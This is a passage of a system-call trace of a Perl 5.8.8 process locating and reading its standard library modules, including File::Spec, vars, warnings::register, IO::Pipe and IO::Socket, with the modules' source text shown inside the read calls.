12207 20:24:32.650458 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
12207 20:24:32.650534 stat64("/etc/perl/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650549 stat64("/etc/perl/vars.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:32.650562 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650574 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:32.650588 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650601 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:32.650616 stat64("/usr/lib/perl5/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650628 stat64("/usr/lib/perl5/vars.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:32.650641 stat64("/usr/share/perl5/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650653 stat64("/usr/share/perl5/vars.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:32.650667 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650679 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfcaa7ac) = -1 ENOENT (No such file or directory)
12207 20:24:32.650780 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfcaa89c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650840 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
12207 20:24:32.650861 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
12207 20:24:32.650879 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaa5b8) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.650891 _llseek(10, 0, [0], SEEK_CUR) = 0
12207 20:24:32.650922 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
12207 20:24:32.651044 stat64("/etc/perl/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651059 stat64("/etc/perl/warnings/register.pm", 0xbfcaa2fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.651073 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651086 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfcaa2fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.651101 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651114 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfcaa2fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.651129 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651141 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfcaa2fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.651155 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651168 stat64("/usr/share/perl5/warnings/register.pm", 0xbfcaa2fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.651182 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651195 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfcaa2fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.651210 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfcaa3ec) = -1 ENOENT (No such file or directory)
12207 20:24:32.651223 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
12207 20:24:32.651245 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
12207 20:24:32.651274 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaa108) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.651315 _llseek(11, 0, [0], SEEK_CUR) = 0
12207 20:24:32.651354 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
12207 20:24:32.708889 read(11, "", 4096) = 0
12207 20:24:32.708931 close(11)         = 0
12207 20:24:32.709143 _llseek(10, 1148, [1148], SEEK_SET) = 0
12207 20:24:32.709160 _llseek(10, 0, [1148], SEEK_CUR) = 0
12207 20:24:32.709171 close(10)         = 0
12207 20:24:32.709319 _llseek(8, 594, [594], SEEK_SET) = 0
12207 20:24:32.709334 _llseek(8, 0, [594], SEEK_CUR) = 0
12207 20:24:32.709344 close(8)          = 0
12207 20:24:32.709381 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709399 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709413 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709427 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709441 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709454 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709468 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709481 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709494 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709507 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709521 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709535 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709548 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.709562 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
12207 20:24:32.709584 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.709600 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.709612 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.709630 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
12207 20:24:32.710354 brk(0x8218000)    = 0x8218000
12207 20:24:32.710484 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
12207 20:24:32.710912 read(8, "", 4096) = 0
12207 20:24:32.710928 close(8)          = 0
12207 20:24:32.711119 read(6, "", 4096) = 0
12207 20:24:32.711133 close(6)          = 0
12207 20:24:32.711387 stat64("/etc/perl/IO/Pipe.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.711405 stat64("/etc/perl/IO/Pipe.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.711419 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.711433 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.711447 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.711459 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.711473 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.711485 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.711498 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.711510 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.711523 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.711537 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
12207 20:24:32.711558 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.711573 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.711584 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.711605 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
12207 20:24:32.712360 _llseek(6, 3425, [3425], SEEK_SET) = 0
12207 20:24:32.712390 _llseek(6, 0, [3425], SEEK_CUR) = 0
12207 20:24:32.712401 close(6)          = 0
12207 20:24:32.712425 stat64("/etc/perl/IO/Socket.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.712439 stat64("/etc/perl/IO/Socket.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.712453 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.712466 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.712480 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.712497 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.712511 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.712523 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.712536 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.712548 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.712561 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.712574 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
12207 20:24:32.712595 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.712610 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.712621 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.712638 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    